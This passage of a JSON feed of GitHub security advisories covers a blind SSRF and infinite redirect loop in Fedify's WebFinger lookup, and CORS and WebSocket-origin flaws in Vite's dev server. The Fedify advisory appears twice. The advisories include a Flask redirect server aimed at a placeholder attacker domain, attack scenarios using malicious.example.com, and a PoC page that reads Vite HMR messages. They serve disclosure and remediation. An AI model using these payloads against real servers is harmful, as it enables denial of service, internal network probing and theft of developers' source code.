instanceof SyntaxError) {\n        logger.debug(\n          \"Failed to parse WebFinger resource descriptor as JSON: {error}\",\n          { error: e },\n        );\n        return null;\n      }\n      throw e;\n    }\n  }\n}\n</code></pre>\n<p>The function takes the <strong>actorId</strong> parameter containing the actor ID URL, extracts the scheme and uses the rest of the URL (host+port+path) directly inside a hard-coded Webfinger URL address which in turn sinks into a fetch request.</p>\n<p>On the fetch request, the <strong>redirect</strong> attribute is set to “<strong>manual</strong>” preventing automated redirects. However, redirects are still handled using custom code that loops over responses and re-fetching the URL found inside the “Location” header until receiving a valid response or an error occurs (loop keeps until 300&gt;status code&gt;400).</p>\n<p>This custom redirect implementation contains multiple issues:\n1.The redirect loop is endless ( while(true) loop ) without any iteration limiting, allowing attackers to perform DoS via endless redirecting.\n2. A Blind SSRF attack to any URL, with arbitrary Host, Port and Path is possible via the current custom redirect implementation.\n3. As the redirect handler is a custom one, it breaches the security mechanisms presented by the native redirect handler of fetch - allowing the attacker to redirect to different schemes such as data or file schemes.</p>\n<p>In order to successfully perform any of the attacks described above, an attacker needs to create a federated app which presents a malicious actor object, containing an actor ID URL of a second server which performs a recursive redirect to itself, or a URL containing an internal resource.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>In order to show a use case of the vulnerability, we can use the demo app presented at this URL: <a href=\"https://github.com/dahlia/microblog\">https://github.com/dahlia/microblog</a>.</li>\n<li>We will create two machines, victim and attacker, each one on a different server with different domains.</li>\n</ol>\n<p><strong><em>Victim Machine</em></strong></p>\n<ol>\n<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>\n<li>Install a Deno server:\n<code>curl -fsSL https://deno.land/install.sh | sh</code>\n<code>source ~/.bashrc</code>\n<code>deno --version #check deno is working</code></li>\n<li>Pull the git repository of the victim blog app:\n<code>git clone https://github.com/dahlia/fedify.git</code></li>\n<li>Modify the federation object to remove signature checks for the sake of easy testing:\nOn file <strong><em>/examples/blog/federation/mod.ts</em></strong> edit the <strong><em>createFederation</em></strong> object the following attribute: <strong><em>skipSignatureVerification: true</em></strong>.</li>\n<li>Change into the blog app directory ( /examples/blog ) and run the app:\n<code>deno task preview</code></li>\n<li>Surf to the application on the browser, and register a user on the app.</li>\n</ol>\n<p><strong><em>Attacker Machine</em></strong></p>\n<ol>\n<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>\n<li>Install NVM in order to install the latest version of NPM and NODEJS (and source current shell to check it worked):\n<code>curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash</code>\n<code>source ~/.bashrc</code>\n<code>nvm list-remote</code></li>\n<li>Install the latest stable version:\n<code>nvm install {latest_ver} #for example: v20.10.0</code>\n<code>source ~/.bashrc</code>\n<code>npm -v #check it works</code>\n<code>node -v #check it works</code></li>\n<li>Download the attacker app repository:\n<code>git clone https://github.com/dahlia/microblog.git</code></li>\n<li>Disable request signature validations:\nEdit the <strong><em>/src/federation.ts</em></strong> file and add a <strong><em>skipSignatureVerification: true</em></strong> attribute to the <strong><em>createFederation</em></strong> object.</li>\n<li>Modify the <strong><em>/src/federation.ts</em></strong> file and tamper with the Person object on the actor dispatcher ( <strong><em>setActorDispatcher(\"/users/{identifier}\"</em></strong> ) - change the actor ID attribute **<em>“id: ctx.getActorUri(identifier)</em><strong>” into “</strong><em>id: new URL(‘http://:1337/users/enterloop’)</em>**”.</li>\n<li>Install python flask and create the Python Flask redirect server:\n<code>apt update</code>\n<code>apt install python3-flask</code></li>\n</ol>\n<pre><code class=\"language-python\">from flask import Flask, redirect\n\napp = Flask(__name__)\n\n@app.route('/health')\ndef health():\n    return \"hello\", 200\n\n@app.route('/.well-known/webfinger')\ndef ssrfinger():\n    return redirect(\"http://&lt;ATTACKER_MACHINE_DOMAIN&gt;:1337/endlessloop\")\n\n@app.route('/endlessloop')\ndef endlessloop():\n    return redirect(\"http://&lt;ATTACKER_MACHINE_DOMAIN&gt;:1337/endlessloop\")\n\nif __name__ == '__main__':\n    app.run(debug=True,host='0.0.0.0' ,port=1337)\n</code></pre>\n<ol start=\"8\">\n<li>Run the python server and attempt to reach the “**_/health_**” path to see the server functions as expected.</li>\n<li>Read the <strong><em>README.txt</em></strong> file on the attacker app and follow the instructions on how to execute the app.</li>\n<li>Surf the app on the browser and attempt to follow the federated user on the victim’s machine.</li>\n<li>Send the “follow” request and watch the victim app continue to query the redirect server infinitely (It is possible to repeat this step multiple times causing multiple loops).</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<ol>\n<li>Implement a limiting stop condition for the endless loop to prevent infinite loops.</li>\n<li>Validate the scheme while performing a manual redirection handler.</li>\n<li>For each web resource (for the <strong><em>lookupWebFinger</em></strong> function and also URLs found on the “**<em>Location</em><strong>” header inside the loop) use the “</strong><em>validatePublicUrl</em>**” function to verify that it is not targeting a local resource.</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx\">https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23221\">https://nvd.nist.gov/vuln/detail/CVE-2025-23221</a></li>\n<li><a href=\"https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151\">https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151</a></li>\n<li><a href=\"https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a\">https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a</a></li>\n<li><a href=\"https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645\">https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c59p-wq67-24wx\">https://github.com/advisories/GHSA-c59p-wq67-24wx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c59p-wq67-24wx",
            "title": "[@fedify/fedify] Infinite loop and Blind SSRF found inside the Webfinger mechanism in @fedify/fedify",
            "date_modified": "2025-01-21T19:58:30.000Z",
            "date_published": "2025-01-21T19:58:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c59p-wq67-24wx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>This vulnerability allows a user to maneuver the Webfinger mechanism to perform a GET request to any internal resource on any Host, Port, URL combination regardless of present security mechanisms, and forcing the victim’s server into an infinite loop causing Denial of Service.\nMoreover, this issue can also be maneuvered into performing a Blind SSRF attack.</p>\n<h3 id=\"details\">Details</h3>\n<p>The Webfinger endpoint takes a remote domain for checking accounts as a feature, however, as per the ActivityPub spec (<a href=\"https://www.w3.org/TR/activitypub/#security-considerations\">https://www.w3.org/TR/activitypub/#security-considerations</a>), on the security considerations section at B.3, access to Localhost services should be prevented while running in production.</p>\n<p>The <strong>lookupWebFinger</strong> function, responsible for returning an actor handler for received actor objects from a remote server, can be abused to perform a Denial of Service (DoS) and Blind SSRF attacks while attempting to resolve a malicious actor’s object.\nOn Fedify, two client-facing functions implement the <strong>lookupWebFinger</strong> function- <strong>getActorHandle</strong>, and <strong>lookupObject</strong>, which are both used as a wrapper for the vulnerable lookup function.\nAs the <strong>lookupObject</strong> function is implemented only for CLI usage, we won’t focus our PoC and explanation on it, but it is still vulnerable in the same way <strong>getActorHandle</strong> is.</p>\n<p>The <strong>getActorHandle</strong> function is a wrapper function for the <strong>getActorHandleInternal</strong> function (both present at <em>/src/vocab/actor.ts</em>):</p>\n<pre><code class=\"language-javascript\">async function getActorHandleInternal(\n  actor: Actor | URL,\n  options: GetActorHandleOptions = {},\n): Promise&lt;`@${string}@${string}` | `${string}@${string}`&gt; {\n  const actorId = actor instanceof URL ? actor : actor.id;\n  if (actorId != null) {\n    const result = await lookupWebFinger(actorId, {\n      userAgent: options.userAgent,\n      tracerProvider: options.tracerProvider,\n    });\n    if (result != null) {\n      const aliases = [...(result.aliases ?? [])];\n      if (result.subject != null) aliases.unshift(result.subject);\n      for (const alias of aliases) {\n        const match = alias.match(/^acct:([^@]+)@([^@]+)$/);\n        if (match != null) {\n          const hostname = new URL(`https://${match[2]}/`).hostname;\n          if (\n            hostname !== actorId.hostname &amp;&amp;\n            !await verifyCrossOriginActorHandle(\n              actorId.href,\n              alias,\n              options.userAgent,\n              options.tracerProvider,\n            )\n          ) {\n            continue;\n          }\n          return normalizeActorHandle(`@${match[1]}@${match[2]}`, options);\n        }\n      }\n    }\n  }\n  if (\n    !(actor instanceof URL) &amp;&amp; actor.preferredUsername != null &amp;&amp;\n    actor.id != null\n  ) {\n    return normalizeActorHandle(\n      `@${actor.preferredUsername}@${actor.id.host}`,\n      options,\n    );\n  }\n  throw new TypeError(\n    \"Actor does not have enough information to get the handle.\",\n  );\n}\n</code></pre>\n<p>The <strong>actorId</strong> parameter containing a URL of the actor ID sinks into the <strong>lookupWebFinger</strong> function which is a wrapper for the <strong>lookupWebFingerInternal</strong>:</p>\n<pre><code class=\"language-javascript\">async function lookupWebFingerInternal(\n  resource: URL | string,\n  options: LookupWebFingerOptions = {},\n): Promise&lt;ResourceDescriptor | null&gt; {\n  if (typeof resource === \"string\") resource = new URL(resource);\n  let protocol = \"https:\";\n  let server: string;\n  if (resource.protocol === \"acct:\") {\n    const atPos = resource.pathname.lastIndexOf(\"@\");\n    if (atPos &lt; 0) return null;\n    server = resource.pathname.substring(atPos + 1);\n    if (server === \"\") return null;\n  } else {\n    protocol = resource.protocol;\n    server = resource.host;\n  }\n  let url = new URL(`${protocol}//${server}/.well-known/webfinger`);\n  url.searchParams.set(\"resource\", resource.href);\n  while (true) {\n    logger.debug(\n      \"Fetching WebFinger resource descriptor from {url}...\",\n      { url: url.href },\n    );\n    let response: Response;\n    try {\n      response = await fetch(url, {\n        headers: {\n          Accept: \"application/jrd+json\",\n          \"User-Agent\": typeof options.userAgent === \"string\"\n            ? options.userAgent\n            : getUserAgent(options.userAgent),\n        },\n        redirect: \"manual\",\n      });\n    } catch (error) {\n      logger.debug(\n        \"Failed to fetch WebFinger resource descriptor: {error}\",\n        { url: url.href, error },\n      );\n      return null;\n    }\n    if (\n      response.status &gt;= 300 &amp;&amp; response.status &lt; 400 &amp;&amp;\n      response.headers.has(\"Location\")\n    ) {\n      url = new URL(\n        response.headers.get(\"Location\")!,\n        response.url == null || response.url === \"\" ? url : response.url,\n      );\n      continue;\n    }\n    if (!response.ok) {\n      logger.debug(\n        \"Failed to fetch WebFinger resource descriptor: {status} {statusText}.\",\n        {\n          url: url.href,\n          status: response.status,\n          statusText: response.statusText,\n        },\n      );\n      return null;\n    }\n    try {\n      return await response.json() as ResourceDescriptor;\n    } catch (e) {\n      if (e instanceof SyntaxError) {\n        logger.debug(\n          \"Failed to parse WebFinger resource descriptor as JSON: {error}\",\n          { error: e },\n        );\n        return null;\n      }\n      throw e;\n    }\n  }\n}\n</code></pre>\n<p>The function takes the <strong>actorId</strong> parameter containing the actor ID URL, extracts the scheme and uses the rest of the URL (host+port+path) directly inside a hard-coded Webfinger URL address which in turn sinks into a fetch request.</p>\n<p>On the fetch request, the <strong>redirect</strong> attribute is set to “<strong>manual</strong>” preventing automated redirects. However, redirects are still handled using custom code that loops over responses and re-fetching the URL found inside the “Location” header until receiving a valid response or an error occurs (loop keeps until 300&gt;status code&gt;400).</p>\n<p>This custom redirect implementation contains multiple issues:\n1.The redirect loop is endless ( while(true) loop ) without any iteration limiting, allowing attackers to perform DoS via endless redirecting.\n2. A Blind SSRF attack to any URL, with arbitrary Host, Port and Path is possible via the current custom redirect implementation.\n3. As the redirect handler is a custom one, it breaches the security mechanisms presented by the native redirect handler of fetch - allowing the attacker to redirect to different schemes such as data or file schemes.</p>\n<p>In order to successfully perform any of the attacks described above, an attacker needs to create a federated app which presents a malicious actor object, containing an actor ID URL of a second server which performs a recursive redirect to itself, or a URL containing an internal resource.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>In order to show a use case of the vulnerability, we can use the demo app presented at this URL: <a href=\"https://github.com/dahlia/microblog\">https://github.com/dahlia/microblog</a>.</li>\n<li>We will create two machines, victim and attacker, each one on a different server with different domains.</li>\n</ol>\n<p><strong><em>Victim Machine</em></strong></p>\n<ol>\n<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>\n<li>Install a Deno server:\n<code>curl -fsSL https://deno.land/install.sh | sh</code>\n<code>source ~/.bashrc</code>\n<code>deno --version #check deno is working</code></li>\n<li>Pull the git repository of the victim blog app:\n<code>git clone https://github.com/dahlia/fedify.git</code></li>\n<li>Modify the federation object to remove signature checks for the sake of easy testing:\nOn file <strong><em>/examples/blog/federation/mod.ts</em></strong> edit the <strong><em>createFederation</em></strong> object the following attribute: <strong><em>skipSignatureVerification: true</em></strong>.</li>\n<li>Change into the blog app directory ( /examples/blog ) and run the app:\n<code>deno task preview</code></li>\n<li>Surf to the application on the browser, and register a user on the app.</li>\n</ol>\n<p><strong><em>Attacker Machine</em></strong></p>\n<ol>\n<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>\n<li>Install NVM in order to install the latest version of NPM and NODEJS (and source current shell to check it worked):\n<code>curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash</code>\n<code>source ~/.bashrc</code>\n<code>nvm list-remote</code></li>\n<li>Install the latest stable version:\n<code>nvm install {latest_ver} #for example: v20.10.0</code>\n<code>source ~/.bashrc</code>\n<code>npm -v #check it works</code>\n<code>node -v #check it works</code></li>\n<li>Download the attacker app repository:\n<code>git clone https://github.com/dahlia/microblog.git</code></li>\n<li>Disable request signature validations:\nEdit the <strong><em>/src/federation.ts</em></strong> file and add a <strong><em>skipSignatureVerification: true</em></strong> attribute to the <strong><em>createFederation</em></strong> object.</li>\n<li>Modify the <strong><em>/src/federation.ts</em></strong> file and tamper with the Person object on the actor dispatcher ( <strong><em>setActorDispatcher(\"/users/{identifier}\"</em></strong> ) - change the actor ID attribute **<em>“id: ctx.getActorUri(identifier)</em><strong>” into “</strong><em>id: new URL(‘http://:1337/users/enterloop’)</em>**”.</li>\n<li>Install python flask and create the Python Flask redirect server:\n<code>apt update</code>\n<code>apt install python3-flask</code></li>\n</ol>\n<pre><code class=\"language-python\">from flask import Flask, redirect\n\napp = Flask(__name__)\n\n@app.route('/health')\ndef health():\n    return \"hello\", 200\n\n@app.route('/.well-known/webfinger')\ndef ssrfinger():\n    return redirect(\"http://&lt;ATTACKER_MACHINE_DOMAIN&gt;:1337/endlessloop\")\n\n@app.route('/endlessloop')\ndef endlessloop():\n    return redirect(\"http://&lt;ATTACKER_MACHINE_DOMAIN&gt;:1337/endlessloop\")\n\nif __name__ == '__main__':\n    app.run(debug=True,host='0.0.0.0' ,port=1337)\n</code></pre>\n<ol start=\"8\">\n<li>Run the python server and attempt to reach the “**_/health_**” path to see the server functions as expected.</li>\n<li>Read the <strong><em>README.txt</em></strong> file on the attacker app and follow the instructions on how to execute the app.</li>\n<li>Surf the app on the browser and attempt to follow the federated user on the victim’s machine.</li>\n<li>Send the “follow” request and watch the victim app continue to query the redirect server infinitely (It is possible to repeat this step multiple times causing multiple loops).</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<ol>\n<li>Implement a limiting stop condition for the endless loop to prevent infinite loops.</li>\n<li>Validate the scheme while performing a manual redirection handler.</li>\n<li>For each web resource (for the <strong><em>lookupWebFinger</em></strong> function and also URLs found on the “**<em>Location</em><strong>” header inside the loop) use the “</strong><em>validatePublicUrl</em>**” function to verify that it is not targeting a local resource.</li>\n</ol>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx\">https://github.com/dahlia/fedify/security/advisories/GHSA-c59p-wq67-24wx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-23221\">https://nvd.nist.gov/vuln/detail/CVE-2025-23221</a></li>\n<li><a href=\"https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151\">https://github.com/dahlia/fedify/commit/8be3c2038eebf4ae12481683a1e809b314be3151</a></li>\n<li><a href=\"https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a\">https://github.com/dahlia/fedify/commit/c505eb82fcd6b5b17174c6659c29721bc801ab9a</a></li>\n<li><a href=\"https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645\">https://github.com/dahlia/fedify/commit/e921134dd5097586e4563ea80b9e8d1b5460a645</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c59p-wq67-24wx\">https://github.com/advisories/GHSA-c59p-wq67-24wx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c59p-wq67-24wx",
            "title": "[@fedify/fedify] Infinite loop and Blind SSRF found inside the Webfinger mechanism in @fedify/fedify",
            "date_modified": "2025-01-21T19:58:30.000Z",
            "date_published": "2025-01-21T19:58:29.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c59p-wq67-24wx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Vite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections.</p>\n<h3 id=\"upgrade-path\">Upgrade Path</h3>\n<p>Users that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration.</p>\n<ul>\n<li>Using the backend integration feature</li>\n<li>Using a reverse proxy in front of Vite</li>\n<li>Accessing the development server via a domain other than <code>localhost</code> or <code>*.localhost</code></li>\n<li>Using a plugin / framework that connects to the WebSocket server on their own from the browser</li>\n</ul>\n<h4 id=\"using-the-backend-integration-feature\">Using the backend integration feature</h4>\n<p>If you are using the backend integration feature and not setting <a href=\"https://vite.dev/config/server-options.html#server-origin\"><code>server.origin</code></a>, you need to add the origin of the backend server to the <a href=\"https://github.com/expressjs/cors#configuration-options\"><code>server.cors.origin</code></a> option. Make sure to set a specific origin rather than <code>*</code>, otherwise any origin can access your development server.</p>\n<h4 id=\"using-a-reverse-proxy-in-front-of-vite\">Using a reverse proxy in front of Vite</h4>\n<p>If you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than <code>localhost</code> or <code>*.localhost</code>, you need to add the hostname to the new <a href=\"https://vite.dev/config/server-options.html#server-allowedhosts\"><code>server.allowedHosts</code></a> option. For example, if the reverse proxy is sending requests to <code>http://vite:5173</code>, you need to add <code>vite</code> to the <code>server.allowedHosts</code> option.</p>\n<h4 id=\"accessing-the-development-server-via-a-domain-other-than-localhost-or-localhost\">Accessing the development server via a domain other than <code>localhost</code> or <code>*.localhost</code></h4>\n<p>You need to add the hostname to the new <a href=\"https://vite.dev/config/server-options.html#server-allowedhosts\"><code>server.allowedHosts</code></a> option. For example, if you are accessing the development server via <code>http://foo.example.com:8080</code>, you need to add <code>foo.example.com</code> to the <code>server.allowedHosts</code> option.</p>\n<h4 id=\"using-a-plugin--framework-that-connects-to-the-websocket-server-on-their-own-from-the-browser\">Using a plugin / framework that connects to the WebSocket server on their own from the browser</h4>\n<p>If you are using a plugin / framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin / framework may have a code that connects to the WebSocket server on their own from the browser.</p>\n<p>In that case, you can either:</p>\n<ul>\n<li>fix the plugin / framework code to the make it compatible with the new version of Vite</li>\n<li>set <code>legacy.skipWebSocketTokenCheck: true</code> to opt-out the fix for [2] while the plugin / framework is incompatible with the new version of Vite<ul>\n<li>When enabling this option, <strong>make sure that you are aware of the security implications</strong> described in the impact section of [2] above.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"mitigation-without-upgrading-vite\">Mitigation without upgrading Vite</h3>\n<h4 id=\"1-permissive-default-cors-settings\">[1]: Permissive default CORS settings</h4>\n<p>Set <code>server.cors</code> to <code>false</code> or limit <code>server.cors.origin</code> to trusted origins.</p>\n<h4 id=\"2-lack-of-validation-on-the-origin-header-for-websocket-connections\">[2]: Lack of validation on the Origin header for WebSocket connections</h4>\n<p>There aren't any mitigations for this.</p>\n<h4 id=\"3-lack-of-validation-on-the-host-header-for-http-requests\">[3]: Lack of validation on the Host header for HTTP requests</h4>\n<p>Use Chrome 94+ or use HTTPS for the development server.</p>\n<h3 id=\"details\">Details</h3>\n<p>There are three causes that allowed malicious websites to send any requests to the development server:</p>\n<h4 id=\"1-permissive-default-cors-settings-1\">[1]: Permissive default CORS settings</h4>\n<p>Vite sets the <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin\"><code>Access-Control-Allow-Origin</code></a> header depending on <a href=\"https://vite.dev/config/server-options.html#server-cors\"><code>server.cors</code></a> option. The default value was <code>true</code> which sets <code>Access-Control-Allow-Origin: *</code>. This allows websites on any origin to <code>fetch</code> contents served on the development server.</p>\n<p>Attack scenario:</p>\n<ol>\n<li>The attacker serves a malicious web page (<code>http://malicious.example.com</code>).</li>\n<li>The user accesses the malicious web page.</li>\n<li>The attacker sends a <code>fetch('http://127.0.0.1:5173/main.js')</code> request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above.</li>\n<li>The attacker gets the content of <code>http://127.0.0.1:5173/main.js</code>.</li>\n</ol>\n<h4 id=\"2-lack-of-validation-on-the-origin-header-for-websocket-connections-1\">[2]: Lack of validation on the Origin header for WebSocket connections</h4>\n<p>Vite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server <a href=\"https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/src/node/server/ws.ts#L145-L157\">did not perform validation on the Origin header</a> and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection (<a href=\"https://github.com/vitejs/vite/blob/v6.0.7/packages/vite/types/hmrPayload.d.ts#L12-L72\">list of the file paths that changed, the file content where the errored happened, etc.</a>), but plugins can send arbitrary messages and may include more sensitive information.</p>\n<p>Attack scenario:</p>\n<ol>\n<li>The attacker serves a malicious web page (<code>http://malicious.example.com</code>).</li>\n<li>The user accesses the malicious web page.</li>\n<li>The attacker runs <code>new WebSocket('http://127.0.0.1:5173', 'vite-hmr')</code> by JS in that malicious web page.</li>\n<li>The user edits some files.</li>\n<li>Vite sends some HMR messages over WebSocket.</li>\n<li>The attacker gets the content of the HMR messages.</li>\n</ol>\n<h4 id=\"3-lack-of-validation-on-the-host-header-for-http-requests-1\">[3]: Lack of validation on the Host header for HTTP requests</h4>\n<p>Unless <a href=\"https://vite.dev/config/server-options.html#server-https\"><code>server.https</code></a> is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy.</p>\n<ol>\n<li>The attacker serves a malicious web page that is served on <strong>HTTP</strong> (<code>http://malicious.example.com:5173</code>) (HTTPS won't work).</li>\n<li>The user accesses the malicious web page.</li>\n<li>The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).</li>\n<li>The attacker sends a <code>fetch('/main.js')</code> request by JS in that malicious web page.</li>\n<li>The attacker gets the content of <code>http://127.0.0.1:5173/main.js</code> bypassing the same origin policy.</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<h4 id=\"1-permissive-default-cors-settings-2\">[1]: Permissive default CORS settings</h4>\n<p>Users with the default <code>server.cors</code> option may:</p>\n<ul>\n<li>get the source code stolen by malicious websites</li>\n<li>give the attacker access to functionalities that are not supposed to be exposed externally<ul>\n<li>Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind <code>server.proxy</code> may have those functionalities.</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"2-lack-of-validation-on-the-origin-header-for-websocket-connections-2\">[2]: Lack of validation on the Origin header for WebSocket connections</h4>\n<p>All users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites.</p>\n<p>For users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites.</p>\n<p>For users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites.</p>\n<h4 id=\"3-lack-of-validation-on-the-host-header-for-http-requests-2\">[3]: Lack of validation on the Host header for HTTP requests</h4>\n<p>Users using HTTP for the development server and using a browser that is not Chrome 94+ may:</p>\n<ul>\n<li>get the source code stolen by malicious websites</li>\n<li>give the attacker access to functionalities that are not supposed to be exposed externally<ul>\n<li>Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind <code>server.proxy</code> may have those functionalities.</li>\n</ul>\n</li>\n</ul>\n<p>Chrome 94+ users are not affected for [3], because <a href=\"https://developer.chrome.com/blog/private-network-access-update#chrome_94\">sending a request to a private network page from public non-HTTPS page is forbidden</a> since Chrome 94.</p>\n<h3 id=\"related-information\">Related Information</h3>\n<p>Safari has <a href=\"https://bugs.webkit.org/show_bug.cgi?id=171934\">a bug that blocks requests to loopback addresses from HTTPS origins</a>. This means when the user is using Safari and Vite is listening on lookback addresses, there's another condition of \"the malicious web page is served on HTTP\" to make [1] and [2] to work.</p>\n<h3 id=\"poc\">PoC</h3>\n<h4 id=\"2-lack-of-validation-on-the-origin-header-for-websocket-connections-3\">[2]: Lack of validation on the Origin header for WebSocket connections</h4>\n<ol>\n<li>I used the <code>react</code> template which utilizes HMR functionality.</li>\n</ol>\n<pre><code>npm create vite@latest my-vue-app-react -- --template react\n</code></pre>\n<ol start=\"2\">\n<li>Then on a malicious server, serve the following POC html:</li>\n</ol>\n<pre><code class=\"language-html\">&lt;!doctype html&gt;\n&lt;html lang=\"en\"&gt;\n    &lt;head&gt;\n        &lt;meta charset=\"utf-8\" /&gt;\n        &lt;title&gt;vite CSWSH&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;div id=\"logs\"&gt;&lt;/div&gt;\n        &lt;script&gt;\n            const div = document.querySelectorAll('#logs')[0];\n            const ws = new WebSocket('ws://localhost:5173','vite-hmr');\n            ws.onmessage = event =&gt; {\n                const logLine = document.createElement('p');\n                logLine.innerHTML = event.data;\n                div.append(logLine);\n            };\n        &lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<ol start=\"3\">\n<li>Kick off Vite</li>\n</ol>\n<pre><code>npm run dev\n</code></pre>\n<ol start=\"4\">\n<li>Load the development server (open <code>http://localhost:5173/</code>) as well as the malicious page in the browser. </li>\n<li>Edit <code>src/App.jsx</code> file and intentionally place a syntax error</li>\n<li>Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed</li>\n</ol>\n<p>Here's a video demonstrating the POC:</p>\n<p><a href=\"https://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961\">https://github.com/user-attachments/assets/a4ad05cd-0b34-461c-9ff6-d7c8663d6961</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6\">https://github.com/vitejs/vite/security/advisories/GHSA-vg6x-rcgg-rjx6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24010\">https://nvd.nist.gov/vuln/detail/CVE-2025-24010</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vg6x-rcgg-rjx6\">https://github.com/advisories/GHSA-vg6x-rcgg-rjx6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vg6x-rcgg-rjx6",
            "title": "[vite] Websites were able to send any requests to the development server and read the response in vite",
            "date_modified": "2025-01-21T19:52:56.000Z",
            "date_published": "2025-01-21T19:52:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vg6x-rcgg-rjx6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Vite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections.</p>\n<h3 id=\"upgrade-path\">Upgrade Path</h3>\n<p>Users that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration.</p>\n<ul>\n<li>Using the backend integration feature</li>\n<li>Using a reverse proxy in front of Vite</li>\n<li>Accessing the development server via a domain other than <code>localhost</code> or <code>*.localhost</code></li>\n<li>Using a plugin / framework that connects to the WebSocket server on their own from the browser</li>\n</ul>\n<h4 id=\"using-the-backend-integration-feature\">Using the backend integration feature</h4>\n<p>If you are using the backend integration feature and not setting <a href=\"https://vite.dev/config/server-options.html#server-origin\"><code>server.origin</code></a>, you need to add the origin of the backend server to the <a href=\"https://github.com/expressjs/cors#configuration-options\"><code>server.cors.origin</code></a> option. Make sure to set a specific origin rather than <code>*</code>, otherwise any origin can access your development server.</p>\n<h4 id=\"using-a-reverse-proxy-in-front-of-vite\">Using a reverse proxy in front of Vite</h4>\n<p>If you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than <code>localhost</code> or <code>*.localhost</code>, you need to add the hostname to the new <a href=\"https://vite.dev/config/server-options.html#server-allowedhosts\"><code>server.allowedHosts</code></a> option. For example, if the reverse proxy is sending requests to <code>http://vite:5173</code>, you need to add <code>vite</code> to the <code>server.allowedHosts</code> option.</p>\n<h4 id=\"accessing-the-development-server-via-a-domain-other-than-localhost-or-localhost\">Accessing the development server via a domain other than <code>localhost</code> or 